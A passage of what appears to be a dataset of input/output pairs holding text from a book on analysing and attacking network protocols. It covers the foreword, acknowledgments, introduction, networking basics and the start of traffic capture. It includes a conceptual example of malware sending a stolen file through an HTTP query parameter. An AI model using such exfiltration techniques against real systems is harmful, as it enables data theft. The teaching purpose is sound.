finders who were already coming forward at the rate of\n200,000 bug reports per year for free. The bounties were to focus the atten-\ntion of those friendly, altruistic bug hunters on the problems Microsoft\nneeded the most help with eradicating.\nSo of course, I called on James and a handful of others, because I was\ncounting on them to deliver the buggy goods. For these first Microsoft bug\nbounties, we security grunts in the MSRC really wanted vulnerabilities for\nInternet Explorer (IE) 11 beta, and we wanted something no software ven-\ndor had ever tried to set a bug bounty on before: we wanted to know about\nnew exploitation techniques. That latter bounty was known as the Mitigation\nBypass Bounty, and worth $100,000 at the time.\nI remember sitting with James over a beer in London, trying to get\nhim excited about looking for IE bugs, when he explained that he’d never\nlooked at browser security much before and cautioned me not to expect\nmuch from him.\nJames nevertheless turned in four unique sandbox escapes for IE 11 beta.\nFour.\nThese sandbox escapes were in areas of the IE code that our internal\nteams and private external penetration testers had all missed. Sandbox\nescapes are essential to helping other bugs be more reliably exploitable.\nJames earned bounties for all four bugs, paid for by the IE team itself, plus\nan extra $5,000 bonus out of my bounty budget. Looking back, I probably\nshould have given him an extra $50,000. Because wow. Not bad for a bug\nhunter who had never looked at web browser security before.\nJust a few months later, I was calling James on the phone from outside\na Microsoft cafeteria on a brisk autumn day, absolutely breathless, to tell\nhim that he had just made history. This particular Microsoft Security Grunt\ncouldn’t have been more thrilled to deliver the news that his entry for one\nof the other Microsoft bug bounty programs—the Mitigation Bypass Bounty\nfor $100,000—had been accepted. James Forshaw had found a unique new\nway to bypass all the platform defenses using architecture-level flaws in\nthe latest operating system and won the very first $100,000 bounty from\nMicrosoft.\nxvi Foreword\nOn that phone call, as I recall the conversation, he said he pictured\nme handing him a comically-huge novelty check onstage at Microsoft’s\ninternal BlueHat conference. I sent the marketing department a note\nafter that call, and in an instant, “James and the Giant Check” became\npart of Microsoft and internet history forever.\nWhat I am certain readers will gain in the following pages of this\nbook are pieces of James’s unparalleled brilliance—the same brilliance\nthat I saw arching across a bug report or four so many years ago. There\nare precious few security researchers who can find bugs in one advanced\ntechnology, and fewer still who can find them in more than one with any\nconsistency. Then there are people like James Forshaw, who can focus on\ndeeper architecture issues with a surgeon’s precision. I hope that those\nreading this book, and any future book by James, treat it like a practical\nguide to spark that same brilliance and creativity in their own work.\nIn a bug bounty meeting at Microsoft, when the IE team members\nwere shaking their heads, wondering how they could have missed some of\nthe bugs James reported, I stated simply, “James can see the Lady in the\nRed Dress, as well as the code that rendered her, in the Matrix.” All of\nthose around the table accepted this explanation for the kind of mind at\nwork in James. He could bend any spoon; and by studying his work, if you\nhave an open mind, then so might you.\nFor all the bug finders in the world, here is your bar, and it is high.\nFor all the untold numbers of security grunts in the world, may all your\nbug reports be as interesting and valuable as those supplied by the one\nand only James Forshaw.\nKatie Moussouris\nFounder and CEO, Luta Security\nOctober 2017\nForeword xvii"
  },
  {
    "input": "Acknowledgments",
    "output": "ACKNOWLEDGmENTS\nI’d like to thank you for reading my book; I hope you\nfind it enlightening and of practical use. I’m grateful\nfor the contributions from many different people.\nI must start by thanking my lovely wife Huayi, who made sure I stuck to\nwriting even if I really didn’t want to. Through her encouragement, I fin-\nished it in only four years; without her maybe it could have been written in\ntwo, but it wouldn’t have been as much fun.\nOf course, I definitely wouldn’t be here today without my amazing par-\nents. Their love and encouragement has led me to become a widely recog-\nnized computer security researcher and published author. They bought the\nfamily a computer—an Atari 400—when I was young, and they were instru-\nmental in starting my interest in computers and software development. I\ncan’t thank them enough for giving me all my opportunities.\nActing as a great counterpoint to my computer nerdiness was my oldest\nfriend, Sam Shearon. Always the more confident and outgoing person and\nan incredible artist, he made me see a different side to life.\nThroughout my career, there have been many colleagues and friends\nwho have made major contributions to my achievements. I must highlight\nRichard Neal, a good friend and sometimes line manager who gave me the\nopportunity to find an interest in computer security, a skill set that suited\nmy mindset.\nI also can’t forget Mike Jordon who convinced me to start working at\nContext Information Security in the UK. Along with owners Alex Church\nand Mark Raeburn, they gave me the time to do impactful security research,\nbuild my skills in network protocol analysis, and develop tools such as\nCanape. This experience of attacking real-world, and typically completely\nbespoke, network protocols is what much of the content of this book is\nbased on.\nI must thank Katie Moussouris for convincing me to go for the\nMicrosoft Mitigation Bypass Bounty, raising my profile massively in the\ninformation security world, and of course for giving me a giant novelty\ncheck for $100,000 for my troubles.\nMy increased profile didn’t go amiss when the team for Google Project\nZero—a group of world leading security researchers with the goal of mak-\ning the platforms that we all rely on more secure—was being set up. Will\nHarris mentioned me to the current head of the team, Chris Evans, who\nconvinced me to interview, and soon I was a Googler. Being a member of\nsuch an excellent team makes me proud.\nFinally, I must thank Bill, Laurel, and Liz at No Starch Press for hav-\ning the patience to wait for me to finish this book and for giving me solid\nadvice on how to tackle it. I hope that they, and you, are happy with the\nfinal result.\nxx Acknowledgments"
  },
  {
    "input": "Introduction",
    "output": "INTRODuCTION\nWhen first introduced, the technology that allowed\ndevices to connect to a network was exclusive to large\ncompanies and governments. Today, most people\ncarry a fully networked computing device in their\npocket, and with the rise of the Internet of Things\n(IoT), you can add devices such as your fridge and\nour home’s security system to this interconnected world. The security of\nthese connected devices is therefore increasingly important. Although you\nmight not be too concerned about someone disclosing the details of how\nmany yogurts you buy, if your smartphone is compromised over the same net-\nwork as your fridge, you could lose all your personal and financial informa-\ntion to a malicious attacker.\nThis book is named Attacking Network Protocols because to find secu-\nrity vulnerabilities in a network-connected device, you need to adopt the\nmind-set of the attacker who wants to exploit those weaknesses. Network\nprotocols communicate with other devices on a network, and because these"
  },
  {
    "input": "What’s in This Book?",
    "output": "protocols must be exposed to a public network and often don’t undergo the\nsame level of scrutiny as other components of a device, they’re an obvious\nattack target.\nwhy read this Book?\nMany books discuss network traffic capture for the purposes of diagnostics\nand basic network analysis, but they don’t focus on the security aspects of\nthe protocols they capture. What makes this book different is that it focuses\non analyzing custom protocols to find security vulnerabilities.\nThis book is for those who are interested in analyzing and attacking\nnetwork protocols but don’t know where to start. The chapters will guide you\nthrough learning techniques to capture network traffic, performing analy-\nsis of the protocols, and discovering and exploiting security vulnerabilities.\nThe book provides background information on networking and network\nsecurity, as well as practical examples of protocols to analyze.\nWhether you want to attack network protocols to report security vulner-\nabilities to an application’s vendor or just want to know how your latest IoT\ndevice communicates, you’ll find several topics of interest.\nwhat’s in this Book?\nThis book contains a mix of theoretical and practical chapters. For the\npractical chapters, I’ve developed and made available a networking library\ncalled Canape Core, which you can use to build your own tools for protocol\nanalysis and exploitation. I’ve also provided an example networked applica-\ntion called SuperFunkyChat, which implements a user-to-user chat protocol.\nBy following the discussions in the chapters, you can use the example appli-\ncation to learn the skills of protocol analysis and attack the sample network\nprotocols. Here is a brief breakdown of each chapter:\nChapter 1: The Basics of Networking\nThis chapter describes the basics of computer networking with a particu-\nlar focus on TCP/IP, which forms the basis of application-level network\nprotocols. Subsequent chapters assume that you have a good grasp of the\nnetwork basics. This chapter also introduces the approach I use to model\napplication protocols. The model breaks down the application protocol\ninto flexible layers and abstracts complex technical detail, allowing you\nto focus on the bespoke parts of the protocol you’re analyzing.\nChapter 2: Capturing Application Traffic\nThis chapter introduces the concepts of passive and active capture of\nnetwork traffic, and it’s the first chapter to use the Canape Core net-\nwork libraries for practical tasks.\nxxii Introduction\nChapter 3: Network Protocol Structures\nThis chapter contains details of the internal structures that are common\nacross network protocols, such as the representation of numbers or\nhuman-readable text. When you’re analyzing captured network traf-\nfic, you can use this knowledge to quickly identify common structures,\nspeeding up your analysis.\nChapter 4: Advanced Application Traffic Capture\nThis chapter explores a number of more advanced capture techniques\nthat complement the examples in Chapter 2. The advanced capture\ntechniques include configuring Network Address Translation to redi-\nrect traffic of interest and spoofing the address resolution protocol.\nChapter 5: Analysis from the Wire\nThis chapter introduces methods for analyzing captured network traffic\nusing the passive and active techniques described in Chapter 2. In this\nchapter, we begin using the SuperFunkyChat application to generate\nexample traffic.\nChapter 6: Application Reverse Engineering\nThis chapter describes techniques for reverse engineering network-\nconnected programs. Reverse engineering allows you to analyze a\nprotocol without needing to capture example traffic. These methods\nalso help to identify how custom encryption or obfuscation is imple-\nmented so you can better analyze traffic you’ve captured.\nChapter 7: Network Protocol Security\nThis chapter provides background information on techniques and cryp-\ntographic algorithms used to secure network protocols. Protecting the\ncontents of network traffic from disclosure or tampering as it travels\nover public networks is of the utmost importance for network protocol\nsecurity.\nChapter 8: Implementing the Network Protocol\nThis chapter explains techniques for implementing the application net-\nwork protocol in your own code so you can test the protocol’s behavior\nto find security weaknesses.\nChapter 9: The Root Causes of Vulnerabilities\nThis chapter describes common security vulnerabilities you’ll encounter\nin a network protocol. When you understand the root causes of vulner-\nabilities, you can more easily identify them during analysis.\nChapter 10: Finding and Exploiting Security Vulnerabilities\nThis chapter describes processes for finding security vulnerabilities\nbased on the root causes in Chapter 9 and demonstrates a number of\nways of exploiting them, including developing your own shell code and\nbypassing exploit mitigations through return-oriented programming.\nIntroduction xxiii"
  },
  {
    "input": "Contact Me",
    "output": "Appendix: Network Protocol Analysis Toolkit\nIn the appendix, you’ll find descriptions of some of the tools I com-\nmonly use when performing network protocol analysis. Many of the\ntools are described briefly in the main body of the text as well.\nhow to use this Book\nIf you want to start with a refresher on the basics of networking,\nread Chapter 1 first. When you’re familiar with the basics, proceed to\nChapters 2, 3, and 5 for practical experience in capturing network traffic\nand learning the network protocol analysis process.\nWith the knowledge of the principles of network traffic capture and\nanalysis, you can then move on to Chapters 7 through 10 for practical infor-\nmation on how to find and exploit security vulnerabilities in these protocols.\nChapters 4 and 6 contain more advanced information about additional cap-\nture techniques and application reverse engineering, so you can read them\nafter you’ve read the other chapters if you prefer.\nFor the practical examples, you’ll need to install .NET Core (https://\nwww.microsoft.com/net/core/), which is a cross-platform version of the .NET\nruntime from Microsoft that works on Windows, Linux, and macOS. You\ncan then download releases for Canape Core from https://github.com/tyranid/\nCANAPE.Core/releases/ and SuperFunkyChat from https://github.com/tyranid/\nExampleChatApplication/releases/; both use .NET Core as the runtime. Links to\neach site are available with the book’s resources at https://www.nostarch.com/\nnetworkprotocols/.\nTo execute the example Canape Core scripts, you’ll need to use the\nCANAPE.Cli application, which will be in the release package downloaded\nfrom the Canape Core Github repository. Execute the script with the follow-\ning command line, replacing script.csx with the name of the script you want\nto execute.\ndotnet exec CANAPE.Cli.dll script.csx\nAll example listings for the practical chapters as well as packet captures\nare available on the book’s page at https://www.nostarch.com/networkprotocols/.\nIt’s best to download these example listings before you begin so you can fol-\nlow the practical chapters without having to enter a large amount of source\ncode manually.\ncontact Me\nI’m always interested in receiving feedback, both positive and negative, on\nmy work, and this book is no exception. You can email me at attacking.network\n.protocols@gmail.com. You can also follow me on Twitter @tiraniddo or subscribe\nto my blog at https://tyranidslair.blogspot.com/ where I post some of my latest\nadvanced security research.\nxxiv Introduction"
  },
  {
    "input": "Network Architecture and Protocols",
    "output": "1\nTHE B ASICS Of N E T WORKING\nTo attack network protocols, you need to understand\nthe basics of computer networking. The more you\nunderstand how common networks are built and func-\ntion, the easier it will be to apply that knowledge to\ncapturing, analyzing, and exploiting new protocols.\nThroughout this chapter, I’ll introduce basic network concepts you’ll\nencounter every day when you’re analyzing network protocols. I’ll also lay\nthe groundwork for a way to think about network protocols, making it easier\nto find previously unknown security issues during your analysis.\nnetwork architecture and protocols\nLet’s start by reviewing some basic networking terminology and asking the\nfundamental question: what is a network? A network is a set of two or more\ncomputers connected together to share information. It’s common to refer\nto each connected device as a node on the network to make the descrip-\ntion applicable to a wider range of devices. Figure 1-1 shows a very simple\nexample."
  },
  {
    "input": "The Internet Protocol Suite ",
    "output": "Network\nWorkstation Mainframe\nnode node\nServer\nnode\nFigure 1-1: A simple network of three nodes\nThe figure shows three nodes connected with a common network. Each\nnode might have a different operating system or hardware. But as long as\neach node follows a set of rules, or network protocol, it can communicate with\nthe other nodes on the network. To communicate correctly, all nodes on a\nnetwork must understand the same network protocol.\nA network protocol serves many functions, including one or more of\nthe following:\nMaintaining session state Protocols typically implement mechanisms\nto create new connections and terminate existing connections.\nIdentifying nodes through addressing Data must be transmitted to\nthe correct node on a network. Some protocols implement an address-\ning mechanism to identify specific nodes or groups of nodes.\nControlling flow The amount of data transferred across a network\nis limited. Protocols can implement ways of managing data flow to\nincrease throughput and reduce latency.\nGuaranteeing the order of transmitted data Many networks do not\nguarantee that the order in which the data is sent will match the order\nin which it’s received. A protocol can reorder the data to ensure it’s\ndelivered in the correct order.\nDetecting and correcting errors Many networks are not 100 percent\nreliable; data can become corrupted. It’s important to detect corrup-\ntion and, ideally, correct it.\nFormatting and encoding data Data isn’t always in a format suitable\nfor transmitting on the network. A protocol can specify ways of encod-\ning data, such as encoding English text into binary values.\nthe internet protocol suite\nTCP/IP is the de facto protocol that modern networks use. Although you can\nthink of TCP/IP as a single protocol, it’s actually a combination of two proto-\ncols: the Transmission Control Protocol (TCP) and the Internet Protocol (IP). These\n2 Chapter 1\ntwo protocols form part of the Internet Protocol Suite (IPS), a conceptual model\nof how network protocols send network traffic over the internet that breaks\ndown network communication into four layers, as shown in Figure 1-2.\nExample protocols Internet Protocol Suite External connections\nHTTP, SMTP, DNS Application layer User application\nTCP, UDP Transport layer\nIPv4, IPv6 Internet layer\nEthernet, PPP Link layer Physical network\nFigure 1-2: Internet Protocol Suite layers\nThese four layers form a protocol stack. The following list explains each\nlayer of the IPS:\nLink layer (layer 1) This layer is the lowest level and describes the\nphysical mechanisms used to transfer information between nodes on a\nlocal network. Well-known examples include Ethernet (both wired and\nwireless) and Point-to-Point Protocol (PPP).\nInternet layer (layer 2) This layer provides the mechanisms for\naddressing network nodes. Unlike in layer 1, the nodes don’t have to\nbe located on the local network. This level contains the IP; on modern\nnetworks, the actual protocol used could be either version 4 (IPv4) or\nversion 6 (IPv6).\nTransport layer (layer 3) This layer is responsible for connections\nbetween clients and servers, sometimes ensuring the correct order of\npackets and providing service multiplexing. Service multiplexing allows\na single node to support multiple different services by assigning a dif-\nferent number for each service; this number is called a port. TCP and\nthe User Datagram Protocol (UDP) operate on this layer.\nApplication layer (layer 4) This layer contains network protocols, such\nas the HyperText Transport Protocol (HTTP), which transfers web page con-\ntents; the Simple Mail Transport Protocol (SMTP), which transfers email;\nand the Domain Name System (DNS) protocol, which converts a name to a\nnode on the network. Throughout this book, we’ll focus primarily on\nthis layer.\nThe Basics of Networking 3"
  },
  {
    "input": "Headers, Footers, and Addresses",
    "output": "Each layer interacts only with the layer above and below it, but there must\nbe some external interactions with the stack. Figure 1-2 shows two external\nconnections. The link layer interacts with a physical network connection,\ntransmitting data in a physical medium, such as pulses of electricity or light.\nThe application layer interacts with the user application: an application is a\ncollection of related functionality that provides a service to a user. Figure 1-3\nshows an example of an application that processes email. The service pro-\nvided by the mail application is the sending and receiving of messages over\na network.\nMail application\nUser interface Content parsers\nHTML rendering Text, HTML, JPEG\nNetwork communication Network\nSMTP, POP3, IMAP\nMail server\nFigure 1-3: Example mail application\nTypically, applications contain the following components:\nNetwork communication This component communicates over the\nnetwork and processes incoming and outgoing data. For a mail applica-\ntion, the network communication is most likely a standard protocol,\nsuch as SMTP or POP3.\nContent parsers Data transferred over a network usually contains con-\ntent that must be extracted and processed. Content might include tex-\ntual data, such as the body of an email, or it might be pictures or video.\nUser interface (UI) The UI allows the user to view received emails\nand to create new emails for transmission. In a mail application, the UI\nmight display emails using HTML in a web browser.\nNote that the user interacting with the UI doesn’t have to be a human\nbeing. It could be another application that automates the sending and\nreceiving of emails through a command line tool.\ndata encapsulation\nEach layer in the IPS is built on the one below, and each layer is able to\nencapsulate the data from the layer above so it can move between the\nlayers. Data transmitted by each layer is called a protocol data unit (PDU).\nHeaders, Footers, and Addresses\nThe PDU in each layer contains the payload data that is being transmit-\nted. It’s common to prefix a header—which contains information required\n4 Chapter 1\nfor the payload data to be transmitted, such as the addresses of the source\nand destination nodes on the network—to the payload data. Sometimes a\nPDU also has a footer that is suffixed to the payload data and contains values\nneeded to ensure correct transmission, such as error-checking information.\nFigure 1-4 shows how the PDUs are laid out in the IPS.\nLayer 4:\nApplication payload\nApplication layer\nPDU\nSource Destination\nport port\nLayer 3:\n(cid:31) TCP payload\nSession layer\nTCP header\nPDU\nSource Destination\naddress address\nLayer 2:\n(cid:30) IP payload\nInternet layer\nIP header\nPDU\nSource Destination\naddress address\nLayer 1:\n(cid:29) Ethernet payload Footer\nLink layer\nEthernet header\nProtocol data unit (PDU)\nFigure 1-4: IPS data encapsulation\nThe TCP header contains a source and destination port number .\nThese port numbers allow a single node to have multiple unique network\nconnections. Port numbers for TCP (and UDP) range from 0 to 65535.\nMost port numbers are assigned as needed to new connections, but some\nnumbers have been given special assignments, such as port 80 for HTTP.\n(You can find a current list of assigned port numbers in the /etc/services file\non most Unix-like operating systems.) A TCP payload and header are com-\nmonly called a segment, whereas a UDP payload and header are commonly\ncalled a datagram.\nThe IP protocol uses a source and a destination address . The desti-\nnation address allows the data to be sent to a specific node on the network.\nThe source address allows the receiver of the data to know which node sent\nthe data and allows the receiver to reply to the sender.\nIPv4 uses 32-bit addresses, which you’ll typically see written as\nfour numbers separated by dots, such as 192.168.10.1. IPv6 uses 128-bit\naddresses, because 32-bit addresses aren’t sufficient for the number of\nnodes on modern networks. IPv6 addresses are usually written as hexa-\ndecimal numbers separated by colons, such as fe80:0000:0000:0000\n:897b:581e:44b0:2057. Long strings of 0000 numbers are collapsed into\nThe Basics of Networking 5"
  },
  {
    "input": "Data Transmission",
    "output": "two colons. For example, the preceding IPv6 address can also be written\nas fe80::897b:581e:44b0:2057. An IP payload and header are commonly\ncalled a packet.\nEthernet also contains source and destination addresses . Ethernet\nuses a 64-bit value called a Media Access Control (MAC) address, which is\ntypically set during manufacture of the Ethernet adapter. You’ll usually\nsee MAC addresses written as a series of hexadecimal numbers separated\nby dashes or colons, such as 0A-00-27-00-00-0E. The Ethernet payload,\nincluding the header and footer, is commonly referred to as a frame.\nData Transmission\nLet’s briefly look at how data is transferred from one node to another using\nthe IPS data encapsulation model. Figure 1-5 shows a simple Ethernet net-\nwork with three nodes.\n192.1.1.100\n(cid:31)\n(cid:29)\n192.1.1.101 (cid:30)\nMAC: 00-11-22-33-44-55\n192.1.1.50\nMAC: 66-77-88-99-AA-BB\nFigure 1-5: A simple Ethernet network\nIn this example, the node at  with the IP address 192.1.1.101 wants\nto send data using the IP protocol to the node at  with the IP address\n192.1.1.50. (The switch device  forwards Ethernet frames between all\nnodes on the network. The switch doesn’t need an IP address because\nit operates only at the link layer.) Here is what takes place to send data\nbetween the two nodes:\n1. The operating system network stack node  encapsulates the applica-\ntion and transport layer data and builds an IP packet with a source\naddress of 192.1.1.101 and a destination address of 192.1.1.50.\n2. The operating system can at this point encapsulate the IP data as an\nEthernet frame, but it might not know the MAC address of the target\nnode. It can request the MAC address for a particular IP address using\nthe Address Resolution Protocol (ARP), which sends a request to all\nnodes on the network to find the MAC address for the destination IP\naddress.\n6 Chapter 1"
  },
  {
    "input": "Network Routing",
    "output": "3. Once the node at  receives an ARP response, it can build the frame,\nsetting the source address to the local MAC address of 00-11-22-33-44\n-55 and the destination address to 66-77-88-99-AA-BB. The new frame\nis transmitted on the network and is received by the switch .\n4. The switch forwards the frame to the destination node, which\nunpacks the IP packet and verifies that the destination IP address\nmatches. Then the IP payload data is extracted and passes up the\nstack to be received by the waiting application.\nnetwork routing\nEthernet requires that all nodes be directly connected to the same local\nnetwork. This requirement is a major limitation for a truly global network\nbecause it’s not practical to physically connect every node to every other\nnode. Rather than require that all nodes be directly connected, the source\nand destination addresses allow data to be routed over different networks\nuntil the data reaches the desired destination node, as shown in Figure 1-6.\nEthernet network 1 Ethernet network 2\n192.1.1.100 200.0.1.10\n(cid:29)\n(cid:30)\n(cid:31) 192.1.1.1 200.0.1.1\nRouter\n200.0.1.50\n192.1.1.101\nMAC: 66-77-88-99-AA-BB\nMAC: 00-11-22-33-44-55\n192.1.1.50 200.0.1.100\nFigure 1-6: An example of a routed network connecting two Ethernet networks\nFigure 1-6 shows two Ethernet networks, each with separate IP network\naddress ranges. The following description explains how the IP uses this\nmodel to send data from the node at  on network 1 to the node at  on\nnetwork 2.\n1. The operating system network stack node  encapsulates the applica-\ntion and transport layer data, and it builds an IP packet with a source\naddress of 192.1.1.101 and a destination address of 200.0.1.50.\n2. The network stack needs to send an Ethernet frame, but because the\ndestination IP address does not exist on any Ethernet network that the\nnode is connected to, the network stack consults its operating system\nThe Basics of Networking 7"
  },
  {
    "input": "My Model for Network Protocol Analysis",
    "output": "routing table. In this example, the routing table contains an entry for the\nIP address 200.0.1.50. The entry indicates that a router  on IP address\n192.1.1.1 knows how to get to that destination address.\n3. The operating system uses ARP to look up the router’s MAC address at\n192.1.1.1, and the original IP packet is encapsulated within the Ethernet\nframe with that MAC address.\n4. The router receives the Ethernet frame and unpacks the IP packet.\nWhen the router checks the destination IP address, it determines that\nthe IP packet is not destined for the router but for a different node on\nanother connected network. The router looks up the MAC address of\n200.0.1.50, encapsulates the original IP packet into the new Ethernet\nframe, and sends it on to network 2.\n5. The destination node receives the Ethernet frame, unpacks the IP\npacket, and processes its contents.\nThis routing process might be repeated multiple times. For example, if\nthe router was not directly connected to the network containing the node\n200.0.1.50, it would consult its own routing table and determine the next\nrouter it could send the IP packet to.\nClearly, it would be impractical for every node on the network to know\nhow to get to every other node on the internet. If there is no explicit rout-\ning entry for a destination, the operating system provides a default routing\ntable entry, called the default gateway, which contains the IP address of a\nrouter that can forward IP packets to their destinations.\nMy Model for network protocol analysis\nThe IPS describes how network communication works; however, for analysis\npurposes, most of the IPS model is not relevant. It’s simpler to use my model\nto understand the behavior of an application network protocol. My model\ncontains three layers, as shown in Figure 1-7, which illustrates how I would\nanalyze an HTTP request.\nHere are the three layers of my model:\nContent layer Provides the meaning of what is being communicated.\nIn Figure 1-7, the meaning is making an HTTP request for the file\nimage.jpg.\nEncoding layer Provides rules to govern how you represent your con-\ntent. In this example, the HTTP request is encoded as an HTTP GET\nrequest, which specifies the file to retrieve.\nTransport layer Provides rules to govern how data is transferred\nbetween the nodes. In the example, the HTTP GET request is sent\nover a TCP/IP connection to port 80 on the remote node.\n8 Chapter 1\nProtocol model\nContent layer\nI would like to get the file image.jpg\n(File request)\nEncoding layer\nGET /image.jpg HTTP/1.1\n(HTTP)\n4500 0043 50d1 4000 8006 0000 c0a8 0a6d\nd83a d544 40e0 0050 5dff a4e6 6ac2 4254\nTransport layer 5018 0102 78ca 0000 4745 5420 2f69 6d61\n(TCP/IP) 6765 2e6a 7067 2048 5454 502f 312e 310d\n0a0d 0a ...\nFigure 1-7: My conceptual protocol model\nSplitting the model this way reduces complexity with application-specific\nprotocols because it allows us to filter out details of the network protocol that\naren’t relevant. For example, because we don’t really care how TCP/IP is sent\nto the remote node (we take for granted that it will get there somehow), we\nsimply treat the TCP/IP data as a binary transport that just works.\nTo understand why the protocol model is useful, consider this protocol\nexample: imagine you’re inspecting the network traffic from some malware.\nYou find that the malware uses HTTP to receive commands from the opera-\ntor via the server. For example, the operator might ask the malware to enu-\nmerate all files on the infected computer’s hard drive. The list of files can\nbe sent back to the server, at which point the operator can request a specific\nfile to be uploaded.\nIf we analyze the protocol from the perspective of how the opera-\ntor would interact with the malware, such as by requesting a file to\nbe uploaded, the new protocol breaks down into the layers shown in\nFigure 1-8.\nProtocol model\nContent layer\nSending file secret.doc with content 1122..\n(Send file request)\nEncoding layer\nSEND secret.doc 1122..\n(Simple text-based command)\nTransport layer\nGET /image.jpg?e=SEND%20secret.doc%11%22 HTTP/1.1\n(HTTP and TCP/IP)\nFigure 1-8: The conceptual model for a malware protocol using HTTP\nThe Basics of Networking 9"
  },
  {
    "input": "Final Words",
    "output": "The following list explains each layer of the new protocol model:\nContent layer The malicious application is sending a stolen file called\nsecret.doc to the server.\nEncoding layer The encoding of the command to send the stolen file\nis a simple text string with a command SEND followed by the filename\nand the file data.\nTransport layer The protocol uses an HTTP request parameter to\ntransport the command. It uses the standard percent-encoding mecha-\nnism, making it a legal HTTP request.\nNotice in this example that we don’t consider the HTTP request being\nsent over TCP/IP; we’ve combined the encoding and transport layer in\nFigure 1-7 into just the transport layer in Figure 1-8. Although the mal-\nware still uses lower-level protocols, such as TCP/IP, these protocols are\nnot important to the analysis of the malware command to send a file. The\nreason it’s not important is that we can consider HTTP over TCP/IP as a\nsingle transport layer that just works and focus specifically on the unique\nmalware commands.\nBy narrowing our scope to the layers of the protocol that we need\nto analyze, we avoid a lot of work and focus on the unique aspects of the\nprotocol. On the other hand, if we were to analyze this protocol using the\nlayers in Figure 1-7, we might assume that the malware was simply request-\ning the file image.jpg, because it would appear as though that was all the\nHTTP request was doing.\nFinal words\nThis chapter provided a quick tour of the networking basics. I discussed\nthe IPS, including some of the protocols you’ll encounter in real networks,\nand described how data is transmitted between nodes on a local network as\nwell as remote networks through routing. Additionally, I described a way to\nthink about application network protocols that should make it easier for you\nto focus on the unique features of the protocol to speed up its analysis.\nIn Chapter 2, we’ll use these networking basics to guide us in captur-\ning network traffic for analysis. The goal of capturing network traffic is\nto access the data you need to start the analysis process, identify what pro-\ntocols are being used, and ultimately discover security issues that you can\nexploit to compromise the applications using these protocols.\n10 Chapter 1"
  },
  {
    "input": "Chapter 2: Capturing Application Traffic\r",
    "output": "2\nCAPTuRING\nAPPLICATION T R AffIC\nSurprisingly, capturing useful traffic can be a challeng-\ning aspect of protocol analysis. This chapter describes\ntwo different capture techniques: passive and active.\nPassive capture doesn’t directly interact with the traf-\nfic. Instead, it extracts the data as it travels on the wire,\nwhich should be familiar from tools like Wireshark.\nYou’ll find that different applications provide different mechanisms (which\nhave their own advantages and disadvantages) to redirect traffic. Active\ncapture interferes with traffic between a client application and the server;\nthis has great power but can cause some complications. You can think of\nactive capture in terms of proxies or even a man-in-the-middle attack. Let’s\nlook at both active and passive techniques in more depth."
  },
  {
    "input": "Quick Primer for Wireshark",
    "output": "passive network traffic capture\nPassive capture is a relatively easy technique: it doesn’t typically require\nany specialist hardware, nor do you usually need to write your own code.\nFigure 2-1 shows a common scenario: a client and server communicating\nvia Ethernet over a network.\nClient application Server application\nPassive capture device\nFigure 2-1: An example of passive network capture\nPassive network capture can take place either on the network by tap-\nping the traffic as it passes in some way or by sniffing directly on either the\nclient or server host.\nQuick primer for wireshark\nWireshark is perhaps the most popular packet-sniffing application available.\nIt’s cross platform and easy to use, and it comes with many built-in protocol\nanalysis features. In Chapter 5 you’ll learn how to write a dissector to aid\nin protocol analysis, but for now, let’s set up Wireshark to capture IP traffic\nfrom the network.\nTo capture traffic from an Ethernet interface (wired or wireless), the\ncapturing device must be in promiscuous mode. A device in promiscuous mode\nreceives and processes any Ethernet frame it sees, even if that frame wasn’t\ndestined for that interface. Capturing an application running on the same\ncomputer is easy: just monitor the outbound network interface or the local\nloopback interface (better known as localhost). Otherwise, you might need\nto use networking hardware, such as a hub or a configured switch, to ensure\ntraffic is sent to your network interface.\nFigure 2-2 shows the default view when capturing traffic from an\nEthernet interface.\n12 Chapter 2\n(cid:31)\n(cid:30)\n(cid:29)\nFigure 2-2: The default Wireshark view\nThere are three main view areas. Area  shows a timeline of raw packets\ncaptured off the network. The timeline provides a list of the source and\ndestination IP addresses as well as decoded protocol summary information.\nArea  provides a dissected view of the packet, separated into distinct pro-\ntocol layers that correspond to the OSI network stack model. Area  shows\nthe captured packet in its raw form.\nThe TCP network protocol is stream based and designed to recover\nfrom dropped packets or data corruption. Due to the nature of networks\nand IP, there is no guarantee that packets will be received in a particular\norder. Therefore, when you are capturing packets, the timeline view might\nbe difficult to interpret. Fortunately, Wireshark offers dissectors for known\nprotocols that will normally reassemble the entire stream and provide all\nthe information in one place. For example, highlight a packet in a TCP con-\nnection in the timeline view and then select Analyze4Follow TCP Stream\nfrom the main menu. A dialog similar to Figure 2-3 should appear. For pro-\ntocols without a dissector, Wireshark can decode the stream and present it\nin an easy-to-view dialog.\nCapturing Application Traffic 13"
  },
  {
    "input": "System Call Tracing",
    "output": "Figure 2-3: Following a TCP stream\nWireshark is a comprehensive tool, and covering all of its features is\nbeyond the scope of this book. If you’re not familiar with it, obtain a good\nreference, such as Practical Packet Analysis, 3rd Edition (No Starch Press,\n2017), and learn many of its useful features. Wireshark is indispensable for\nanalyzing application network traffic, and it’s free under the General Public\nLicense (GPL).\nalternative passive capture techniques\nSometimes using a packet sniffer isn’t appropriate, for example, in situa-\ntions when you don’t have permission to capture traffic. You might be doing\na penetration test on a system with no administrative access or a mobile\ndevice with a limited privilege shell. You might also just want to ensure that\nyou look at traffic only for the application you’re testing. That’s not always\neasy to do with packet sniffing unless you correlate the traffic based on\ntime. In this section, I’ll describe a few techniques for extracting network\ntraffic from a local application without using a packet-sniffing tool.\nSystem Call Tracing\nMany modern operating systems provide two modes of execution. Kernel\nmode runs with a high level of privilege and contains code implementing\nthe OS’s core functionality. User mode is where everyday processes run. The\nkernel provides services to user mode by exporting a collection of special\nsystem calls (see Figure 2-4), allowing users to access files, create processes—\nand most important for our purposes—connect to networks.\n14 Chapter 2\nNetwork\nKernel Network\nsubsystem\nServer\nKernel/User mode boundary\nSystem libraries\nClient application\nCapturing Application Traffic 15\nllac\nmetsyS\nFigure 2-4: An example of user-to-kernel network communication via\nsystem calls\nWhen an application wants to connect to a remote server, it issues\nspecial system calls to the OS’s kernel to open a connection. The app then\nreads and writes the network data. Depending on the operating system run-\nning your network applications, you can monitor these calls directly to pas-\nsively extract data from an application.\nMost Unix-like systems implement system calls resembling the\nBerkeley Sockets model for network communication. This isn’t surpris-\ning, because the IP protocol was originally implemented in the Berkeley\nSoftware Distribution (BSD) 4.2 Unix operating system. This socket imple-\nmentation is also part of POSIX, making it the de facto standard. Table 2-1\nshows some of the more important system calls in the Berkeley Sockets API.\nTable 2-1: Common Unix System Calls for Networking\nName Description\nsocket Creates a new socket file descriptor .\nconnect Connects a socket to a known IP address and port .\nbind Binds the socket to a local known IP address and port 